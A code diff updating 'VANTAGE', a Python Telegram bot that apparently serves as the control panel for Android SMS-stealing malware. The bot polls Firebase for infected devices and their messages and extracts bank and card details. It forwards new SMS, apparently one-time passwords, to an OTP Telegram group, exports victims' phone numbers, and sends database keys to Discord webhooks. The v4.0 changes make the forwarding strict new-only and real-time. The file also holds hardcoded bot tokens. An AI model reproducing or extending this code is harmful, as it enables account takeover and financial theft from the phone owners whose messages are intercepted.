@@ -1,13 +1,10 @@
 #!/usr/bin/env python3
 """
-VANTAGE Bot v3.0 — Web Service Edition
-- Fake HTTP server for Render port binding (prevents crash loop)
-- Fixed asyncio task scheduling
-- Bulletproof Markdown escaping
-- Flood control with smart retry
+VANTAGE Bot v4.0 — Final Edition
+- Only NEW SMS forwarded (strict timestamp filtering)
+- India Standard Time (IST) for all dates
+- Web Service port binding fix
 - Luxury group messages
-- Full numbers (no mask)
-- Real-time SMS only
 - Advanced admin panel
 """
 
@@ -21,7 +18,7 @@ import asyncio
 import logging
 import threading
 import zipfile
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Optional, Dict, List, Any
 
@@ -37,7 +34,7 @@ from telegram.error import RetryAfter, TelegramError
 # ============================================
 # CONFIG
 # ============================================
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAGDsQV5s8BusBIPBlvIhLJ3wMOH92hGugo")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAE2BEwV6zOr0XKEUOaJ4oAm5EygyHJA770")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6840524720").split(",") if x.strip().isdigit()]
 
 SMS_GROUP_LINK = os.getenv("SMS_GROUP_LINK", "https://t.me/fire_x_otp_group")
@@ -53,6 +50,9 @@ DATA_FILE = "vantage_bot_data.json"
 POLL_INTERVAL = 5
 SEND_DELAY = 1.3
 MAX_SEND_RETRY = 3
+
+# India Standard Time (UTC+5:30)
+IST = timezone(timedelta(hours=5, minutes=30))
 
 # States
 (MAIN_MENU, ADD_URL, ADD_KEY, SEND_NUM, SEND_MSG,
@@ -70,36 +70,43 @@ _send_lock = asyncio.Lock()
 _last_send_time = 0
 
 
+def now_ist() -> datetime:
+    """Current India time"""
+    return datetime.now(IST)
+
+
+def now_ist_str() -> str:
+    """Formatted India time string"""
+    return now_ist().strftime("%d %b %Y, %I:%M:%S %p")
+
+
 # ============================================
-# HEALTH SERVER (Render Web Service fix)
+# HEALTH SERVER (Render Web Service)
 # ============================================
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header("Content-Type", "text/plain")
         self.end_headers()
-        self.wfile.write(b"VANTAGE Bot OK")
+        self.wfile.write(b"VANTAGE Bot v4.0 OK")
     
     def do_HEAD(self):
         self.send_response(200)
         self.end_headers()
     
     def log_message(self, *args):
-        pass  # silence
+        pass
 
 
 def start_health_server():
-    """Start fake HTTP server for Render port binding"""
     def _run():
         try:
             server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
-            logger.info(f"✅ Health server listening on port {PORT}")
+            logger.info(f"✅ Health server on port {PORT}")
             server.serve_forever()
         except Exception as e:
-            logger.error(f"Health server error: {e}")
-    
-    t = threading.Thread(target=_run, daemon=True)
-    t.start()
+            logger.error(f"Health server: {e}")
+    threading.Thread(target=_run, daemon=True).start()
 
 
 # ============================================
@@ -131,7 +138,7 @@ def save_data(data: Dict):
             json.dump(data, f, indent=2, ensure_ascii=False)
         os.replace(tmp, DATA_FILE)
     except Exception as e:
-        logger.error(f"Save error: {e}")
+        logger.error(f"Save: {e}")
 
 
 DB = load_data()
@@ -153,7 +160,7 @@ def register_user(uid: int, username: str, name: str):
         reg[str(uid)] = {
             "username": username or "",
             "name": name or "",
-            "first_seen": datetime.now().isoformat(),
+            "first_seen": now_ist().isoformat(),
         }
         save_data(DB)
 
@@ -217,6 +224,86 @@ async def fb_delete(url: str, key: str, path: str) -> bool:
 
 
 # ============================================
+# TIMESTAMP PARSER (India Time aware)
+# ============================================
+def parse_msg_timestamp(time_str: str) -> Optional[float]:
+    """Parse message time to Unix timestamp (milliseconds). Returns None if unparseable."""
+    if not time_str:
+        return None
+    
+    time_str = str(time_str).strip()
+    
+    # Try ISO format (Firebase standard)
+    try:
+        # Handle "2026-10-26T14:30:00.000Z" or similar
+        cleaned = time_str.replace('Z', '+00:00')
+        dt = datetime.fromisoformat(cleaned)
+        if dt.tzinfo is None:
+            dt = dt.replace(tzinfo=timezone.utc)
+        return dt.timestamp() * 1000
+    except Exception:
+        pass
+    
+    # Try common formats with India time
+    formats = [
+        "%d/%m/%Y %H:%M:%S",   # 26/10/2026 14:30:00
+        "%d/%m/%Y %H:%M",       # 26/10/2026 14:30
+        "%d-%m-%Y %H:%M:%S",    # 26-10-2026 14:30:00
+        "%d-%m-%Y %H:%M",       # 26-10-2026 14:30
+        "%Y-%m-%d %H:%M:%S",    # 2026-10-26 14:30:00
+        "%Y-%m-%d %H:%M",       # 2026-10-26 14:30
+        "%d %b %Y %H:%M:%S",    # 26 Oct 2026 14:30:00
+        "%d %b %Y, %I:%M:%S %p", # 26 Oct 2026, 02:30:00 PM
+        "%I:%M:%S %p",          # 02:30:00 PM (today)
+        "%d/%m/%Y",             # 26/10/2026 (date only)
+    ]
+    
+    for fmt in formats:
+        try:
+            dt = datetime.strptime(time_str, fmt)
+            if dt.year < 2020:  # Just time, use today's date
+                today = now_ist()
+                dt = dt.replace(year=today.year, month=today.month, day=today.day)
+            # Assume India time
+            dt = dt.replace(tzinfo=IST)
+            return dt.timestamp() * 1000
+        except Exception:
+            continue
+    
+    return None
+
+
+def get_firebase_key_timestamp(key: str) -> Optional[float]:
+    """
+    Extract timestamp from Firebase push key.
+    Firebase keys are chronological but not directly timestamp.
+    If key is numeric (Unix ms), use it.
+    """
+    if not key:
+        return None
+    try:
+        # If key is numeric timestamp
+        if key.isdigit():
+            ts = int(key)
+            # Could be seconds or ms
+            if ts < 10000000000:  # seconds (< year 2286)
+                return ts * 1000
+            return ts
+    except Exception:
+        pass
+    return None
+
+
+def format_ist(timestamp_ms: float) -> str:
+    """Convert Unix ms to India time string"""
+    try:
+        dt = datetime.fromtimestamp(timestamp_ms / 1000, tz=IST)
+        return dt.strftime("%d %b %Y, %I:%M:%S %p IST")
+    except Exception:
+        return ""
+
+
+# ============================================
 # PARSERS
 # ============================================
 BANK_PATTERNS = [
@@ -264,12 +351,6 @@ PHONE_PATTERNS = [
     r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})',
     r'(\+91[-\s]?[6-9][0-9]{9})',
     r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)',
-]
-
-NETWORK_PATTERNS = [
-    (r'\bJio\b', 'Jio'), (r'\bAirtel\b', 'Airtel'), (r'\bBSNL\b', 'BSNL'),
-    (r'\bVodafone\b', 'Vodafone'), (r'\b(?:Idea|Vi)\b', 'Vi'),
-    (r'\bMTNL\b', 'MTNL'), (r'\bDocomo\b', 'Docomo'),
 ]
 
 
@@ -383,21 +464,22 @@ def parse_messages(raw: Dict) -> List[Dict]:
     if not raw or not isinstance(raw, dict):
         return msgs
     items = list(raw.items())
-    if len(items) > 200:
-        items = items[-200:]
+    if len(items) > 100:
+        items = items[-100:]
     for key, m in items:
         if not isinstance(m, dict):
             continue
         text = str(m.get('message') or m.get('body') or m.get('text') or '')
         if not text.strip():
             continue
+        time_str = str(m.get('dateTime') or m.get('date') or m.get('time') or '')
         msgs.append({
             'key': key,
             'text': text,
             'sender': str(m.get('sender') or m.get('from') or 'Unknown'),
-            'time': str(m.get('dateTime') or m.get('date') or ''),
+            'time_str': time_str,
         })
-    msgs.reverse()
+    msgs.reverse()  # Oldest first
     return msgs
 
 
@@ -434,10 +516,9 @@ def parse_devices(raw: Dict) -> List[Dict]:
 
 
 # ============================================
-# ESCAPE (bulletproof)
+# ESCAPE
 # ============================================
 def esc(t: str) -> str:
-    """Escape all Markdown V1 special chars"""
     if not t:
         return ""
     out = str(t)
@@ -447,14 +528,13 @@ def esc(t: str) -> str:
 
 
 def esc_code(t: str) -> str:
-    """For text inside backticks — just remove backticks"""
     if not t:
         return ""
     return str(t).replace('`', "'")[:100]
 
 
 # ============================================
-# FLOOD-SAFE SEND (bulletproof)
+# FLOOD-SAFE SEND
 # ============================================
 async def safe_send(app: Application, chat_id, text: str, **kwargs):
     global _last_send_time
@@ -477,14 +557,14 @@ async def safe_send(app: Application, chat_id, text: str, **kwargs):
             except TelegramError as e:
                 err = str(e)
                 if "parse" in err.lower() or "entities" in err.lower():
-                    logger.warning("Markdown error — retrying plain text")
+                    logger.warning("Markdown fail — retry plain")
                     kwargs.pop('parse_mode', None)
                     try:
                         msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
                         _last_send_time = time.time()
                         return msg
                     except Exception as e2:
-                        logger.error(f"Plain retry failed: {e2}")
+                        logger.error(f"Plain fail: {e2}")
                         return None
                 logger.error(f"Send error: {e}")
                 await asyncio.sleep(2)
@@ -516,7 +596,7 @@ async def send_discord(url: str, key: str, username: str = "Unknown"):
                 {"name": "🟢 Online", "value": str(online), "inline": True},
             ],
             "footer": {"text": "VANTAGE"},
-            "timestamp": datetime.now().isoformat(),
+            "timestamp": now_ist().isoformat(),
         }]}
         async with aiohttp.ClientSession() as s:
             for wh in DISCORD_WEBHOOKS:
@@ -530,7 +610,7 @@ async def send_discord(url: str, key: str, username: str = "Unknown"):
 
 
 # ============================================
-# ACCOUNT HELPERS
+# ACCOUNTS
 # ============================================
 def get_accounts(uid: int) -> List[Dict]:
     return DB.get('accounts', {}).get(str(uid), [])
@@ -571,7 +651,7 @@ async def fetch_devices_and_msgs(acc: Dict, only_online=True) -> List[Dict]:
                 raw_msgs = await fb_get(
                     acc['url'], acc['key'],
                     f"messages/{dev['id']}",
-                    {"orderBy": '"$key"', "limitToLast": "30"}
+                    {"orderBy": '"$key"', "limitToLast": "50"}
                 )
                 dev['messages'] = parse_messages(raw_msgs)
             except Exception:
@@ -670,36 +750,79 @@ async def parse_apk(file_bytes: bytes) -> Optional[Dict]:
 
 
 # ============================================
-# SMS FORWARDER
+# SMS FORWARDER — STRICT NEW ONLY
 # ============================================
 FORWARDER_RUNNING = False
 
+# In-memory: ignore any message older than bot start time
+BOT_START_TS = time.time() * 1000  # milliseconds
+
 
 async def initial_sync():
-    logger.info("🔄 Initial sync...")
+    """
+    On startup: mark ALL existing messages as seen.
+    Uses BOTH key AND timestamp comparison to prevent old forwards.
+    """
+    logger.info("🔄 Initial sync — capturing current state...")
+    
+    DB['seen_msgs'] = {}
+    save_data(DB)
+    
     all_accounts = DB.get('accounts', {})
-    seen = DB.get('seen_msgs', {})
+    seen = {}
+    total_devices = 0
+    total_msgs = 0
+    
     for uid_str, accs in all_accounts.items():
         for acc in accs:
             try:
-                devices = await fetch_devices_and_msgs(acc, only_online=True)
+                raw = await fb_get(acc['url'], acc['key'], "clients")
+                devices = parse_devices(raw)
+                
                 for dev in devices:
+                    total_devices += 1
                     acc_id = f"{acc['url']}|{dev['id']}"
-                    if dev.get('messages'):
-                        seen[acc_id] = dev['messages'][-1]['key']
-            except Exception:
-                pass
+                    
+                    try:
+                        raw_msgs = await fb_get(
+                            acc['url'], acc['key'],
+                            f"messages/{dev['id']}",
+                            {"orderBy": '"$key"', "limitToLast": "100"}
+                        )
+                        msgs = parse_messages(raw_msgs)
+                        if msgs:
+                            seen[acc_id] = {
+                                'last_key': msgs[-1]['key'],
+                                'last_ts': BOT_START_TS,
+                            }
+                            total_msgs += len(msgs)
+                        else:
+                            seen[acc_id] = {
+                                'last_key': '',
+                                'last_ts': BOT_START_TS,
+                            }
+                    except Exception as e:
+                        logger.error(f"Sync {dev['id']}: {e}")
+                        seen[acc_id] = {
+                            'last_key': '',
+                            'last_ts': BOT_START_TS,
+                        }
+                    
+                    await asyncio.sleep(0.05)
+            except Exception as e:
+                logger.error(f"Sync acc: {e}")
+    
     DB['seen_msgs'] = seen
     save_data(DB)
-    logger.info("✅ Initial sync complete")
+    logger.info(f"✅ Sync complete — {total_devices} devices, {total_msgs} msgs marked")
 
 
 async def forward_loop(app: Application):
     global FORWARDER_RUNNING
     FORWARDER_RUNNING = True
-    logger.info("📡 SMS Forwarder started")
+    logger.info("📡 SMS Forwarder started (STRICT new-only mode)")
     
-    await asyncio.sleep(2)
+    await asyncio.sleep(5)
     await initial_sync()
     
     while FORWARDER_RUNNING:
@@ -712,25 +835,62 @@ async def forward_loop(app: Application):
                         for dev in devices:
                             acc_id = f"{acc['url']}|{dev['id']}"
                             seen = DB.get('seen_msgs', {})
-                            last_seen_key = seen.get(acc_id)
+                            seen_data = seen.get(acc_id)
                             
+                            # If no seen data, initialize silently (no forward)
+                            if not seen_data:
+                                if dev.get('messages'):
+                                    seen[acc_id] = {
+                                        'last_key': dev['messages'][-1]['key'],
+                                        'last_ts': BOT_START_TS,
+                                    }
+                                    DB['seen_msgs'] = seen
+                                    save_data(DB)
+                                continue
+                            
+                            last_key = seen_data.get('last_key', '')
+                            last_ts = seen_data.get('last_ts', BOT_START_TS)
+                            
+                            # STRICT FILTER: only messages with:
+                            # 1. key > last_key (newer in Firebase)
+                            # 2. AND timestamp > last_ts (newer in real time)
                             new_msgs = []
                             for m in dev.get('messages', []):
-                                if last_seen_key and m['key'] <= last_seen_key:
+                                # Must be strictly newer by key
+                                if last_key and m['key'] <= last_key:
                                     continue
-                                if not last_seen_key:
+                                
+                                # Check timestamp if available
+                                msg_ts = parse_msg_timestamp(m['time_str'])
+                                if msg_ts is not None and msg_ts < last_ts:
+                                    # Too old — skip
                                     continue
+                                
+                                # Check Firebase key timestamp if numeric
+                                key_ts = get_firebase_key_timestamp(m['key'])
+                                if key_ts is not None and key_ts < BOT_START_TS:
+                                    # Created before bot started — skip
+                                    continue
+                                
                                 new_msgs.append(m)
                             
+                            # Update seen
                             if dev.get('messages'):
-                                seen[acc_id] = dev['messages'][-1]['key']
+                                latest = dev['messages'][-1]
+                                latest_ts = parse_msg_timestamp(latest['time_str'])
+                                seen[acc_id] = {
+                                    'last_key': latest['key'],
+                                    'last_ts': latest_ts if latest_ts else max(last_ts, time.time() * 1000),
+                                }
                                 DB['seen_msgs'] = seen
+                                save_data(DB)
                             
+                            # Forward new ones
                             for m in new_msgs:
+                                logger.info(f"📨 NEW SMS: {m['sender']} @ {m['time_str']}")
                                 await forward_sms_to_group(app, dev, m)
-                                await asyncio.sleep(0.6)
+                                await asyncio.sleep(0.8)
                         
-                        save_data(DB)
                     except Exception as e:
                         logger.error(f"Forward: {e}")
                     await asyncio.sleep(1)
@@ -742,7 +902,14 @@ async def forward_loop(app: Application):
 def build_luxury_sms(dev: Dict, msg: Dict) -> str:
     sender = msg.get('sender', 'Unknown')
     text = msg.get('text', '')
-    time_str = msg.get('time', '')
+    time_str = msg.get('time_str', '')
+    
+    # Convert to India time
+    msg_ts = parse_msg_timestamp(time_str)
+    if msg_ts:
+        display_time = format_ist(msg_ts)
+    else:
+        display_time = time_str or now_ist_str()
     
     phone = dev['phoneNumber']
     if not phone or phone == '—':
@@ -766,9 +933,8 @@ def build_luxury_sms(dev: Dict, msg: Dict) -> str:
         f"║ 📱 **Device:** {esc(dev['name'][:25])}",
         f"║ 📞 **Number:** `{esc_code(phone)}`",
         f"║ 👤 **From:** `{esc_code(sender)}`",
+        f"║ ⏰ **Time:** {esc(display_time)}",
     ]
-    if time_str:
-        lines.append(f"║ ⏰ **Time:** {esc(time_str)}")
     if dev.get('provider') and dev['provider'] != '—':
         lines.append(f"║ 🌐 **Network:** {esc(dev['provider'])}")
     if dev.get('battery') and dev['battery'] != '—':
@@ -800,6 +966,7 @@ def build_luxury_sms(dev: Dict, msg: Dict) -> str:
             lines.append(f"║ 📅 **Expiry:** {esc(card['expiry'])}")
     
     lines.append("╚══════════════════════")
+    lines.append(f"🕐 Forwarded: {now_ist_str()}")
     return "\n".join(lines)
 
 
@@ -841,7 +1008,7 @@ async def build_admin_menu(uid: int):
     total_users = len(DB.get('user_registry', {}))
     
     text = (
-        f"👑 **VANTAGE ADMIN PANEL**\n\n"
+        f"👑 **VANTAGE ADMIN v4.0**\n\n"
         f"━━━━━━━━━━━━━━━━━━\n"
         f"📡 Accounts: **{len(accounts)}**\n"
         f"🟢 Online Devices: **{online}**\n"
@@ -849,6 +1016,7 @@ async def build_admin_menu(uid: int):
         f"👥 Total Users: **{total_users}**\n"
         f"🔒 Locked Users: **{locked_count}**\n"
         f"🤖 Bot: {'🔴 LOCKED' if bot_locked else '🟢 Active'}\n"
+        f"🕐 {now_ist_str()}\n"
         f"━━━━━━━━━━━━━━━━━━"
     )
     if current:
@@ -872,6 +1040,7 @@ async def build_admin_menu(uid: int):
     kb.append([InlineKeyboardButton("👥 User Management", callback_data="admin_users")])
     kb.append([InlineKeyboardButton("📤 Export Numbers", callback_data="admin_export")])
     kb.append([InlineKeyboardButton("🗑 Remove Firebase", callback_data="admin_remove_fb")])
+    kb.append([InlineKeyboardButton("🔄 Reset Seen (Re-sync)", callback_data="admin_reset_seen")])
     kb.append([InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
     
@@ -901,6 +1070,7 @@ async def build_user_menu(uid: int):
             f"━━━━━━━━━━━━━━━━━━\n"
             f"🟢 Online Devices: **{len(devs)}**\n"
             f"📞 Total Numbers: **{len(numbers)}**\n"
+            f"🕐 {now_ist_str()}\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
         )
         
@@ -986,10 +1156,19 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/unlockuser `<id>`\n"
             "/stats — Stats\n"
             "/users — Users\n"
+            "/time — India time\n"
         )
     else:
-        text = "🤖 **VANTAGE**\n\n/start — Menu\n/refresh — Refresh"
+        text = "🤖 **VANTAGE**\n\n/start — Menu\n/refresh — Refresh\n/time — India time"
     await update.message.reply_text(text, parse_mode='Markdown')
+
+
+async def cmd_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        f"🕐 **India Time:** {now_ist_str()}\n"
+        f"📅 **Timestamp:** `{int(now_ist().timestamp() * 1000)}`",
+        parse_mode='Markdown'
+    )
 
 
 async def cmd_lock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1021,7 +1200,7 @@ async def cmd_lock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reason = " ".join(context.args[1:]) or "Access revoked"
     DB.setdefault('locked_users', {})[str(target)] = {
         'reason': reason,
-        'since': datetime.now().isoformat(),
+        'since': now_ist().isoformat(),
     }
     save_data(DB)
     await update.message.reply_text(f"🔒 `{target}` locked.", parse_mode='Markdown')
@@ -1046,13 +1225,16 @@ async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     all_accs = DB.get('accounts', {})
     total_accs = sum(len(a) for a in all_accs.values())
+    seen_count = len(DB.get('seen_msgs', {}))
     text = (
         f"📊 **STATS**\n\n"
         f"👥 Users: **{len(DB.get('user_registry', {}))}**\n"
         f"📡 Accounts: **{total_accs}**\n"
+        f"📌 Tracking: **{seen_count}** devices\n"
         f"🔒 Locked: **{len(DB.get('locked_users', {}))}**\n"
         f"🚫 Bot Locked: **{'Yes' if DB.get('bot_locked') else 'No'}**\n"
-        f"📤 Broadcasts: **{DB.get('broadcasts_sent', 0)}**"
+        f"📤 Broadcasts: **{DB.get('broadcasts_sent', 0)}**\n"
+        f"🕐 **{now_ist_str()}**"
     )
     await update.message.reply_text(text, parse_mode='Markdown')
 
@@ -1103,6 +1285,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
         return ADD_URL
+    
+    if data == "admin_reset_seen":
+        DB['seen_msgs'] = {}
+        save_data(DB)
+        await query.edit_message_text(
+            "✅ **Seen data reset**\n\n"
+            "Ab bot next poll me sab devices ko fresh mark karega.\n"
+            "Sirf naye messages aayenge.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
+            parse_mode='Markdown'
+        )
+        return MAIN_MENU
     
     if data == "admin_devices":
         try:
@@ -1161,7 +1355,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not nums:
                 await query.edit_message_text("📭 No numbers")
                 return MAIN_MENU
-            content = f"# VANTAGE Export\n# {datetime.now().isoformat()}\n# Total: {len(nums)}\n\n"
+            content = f"# VANTAGE Export\n# {now_ist_str()}\n# Total: {len(nums)}\n\n"
             for n in nums:
                 content += f"{n['number']} | {n['device']} | {n['provider']} | {n['battery']}\n"
             f = io.BytesIO(content.encode())
@@ -1486,7 +1680,7 @@ async def handle_add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 accs.append({
                     'id': int(time.time() * 1000) + added,
                     'url': url, 'key': key,
-                    'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'date': now_ist_str(),
                 })
             added += 1
             await send_discord(url, key, update.effective_user.username or str(uid))
@@ -1637,27 +1831,38 @@ async def post_init(app: Application):
     await app.bot.set_my_commands([
         BotCommand("start", "Main menu"),
         BotCommand("refresh", "Refresh"),
+        BotCommand("time", "India time"),
         BotCommand("help", "Help"),
         BotCommand("cancel", "Cancel"),
     ])
-    # Use asyncio.create_task (proper way inside running loop)
     asyncio.create_task(forward_loop(app))
-    logger.info("✅ VANTAGE Bot v3.0 fully started")
+    logger.info("✅ VANTAGE Bot v4.0 fully started")
 
 
-# ============================================
-# MAIN
-# ============================================
 def main():
     if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
         print("❌ Set BOT_TOKEN env var!")
         return
     
     if not SMS_GROUP_ID:
-        print("⚠️  SMS_GROUP_ID not set — forwarding disabled")
+        print("⚠️  SMS_GROUP_ID not set")
     
-    # Start fake HTTP server FIRST (before bot)
+    # Startup cleanup — force fresh seen data
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, 'r') as f:
+                d = json.load(f)
+            if d.get('seen_msgs'):
+                print("🧹 Clearing old seen_msgs data...")
+                d['seen_msgs'] = {}
+                with open(DATA_FILE, 'w') as f:
+                    json.dump(d, f, indent=2)
+        except Exception:
+            pass
+    
     start_health_server()
+    
+    logger.info(f"🕐 Bot starting at {now_ist_str()}")
     
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
     
@@ -1685,6 +1890,7 @@ def main():
     
     app.add_handler(conv)
     app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CommandHandler("time", cmd_time))
     app.add_handler(CommandHandler("lock", cmd_lock_bot))
     app.add_handler(CommandHandler("unlock", cmd_unlock_bot))
     app.add_handler(CommandHandler("lockuser", cmd_lock_user))
@@ -1693,7 +1899,7 @@ def main():
     app.add_handler(CommandHandler("users", cmd_users))
     app.add_handler(CommandHandler("refresh", cmd_start))
     
-    logger.info("🤖 VANTAGE Bot v3.0 starting...")
+    logger.info("🤖 VANTAGE Bot v4.0 starting...")
     app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
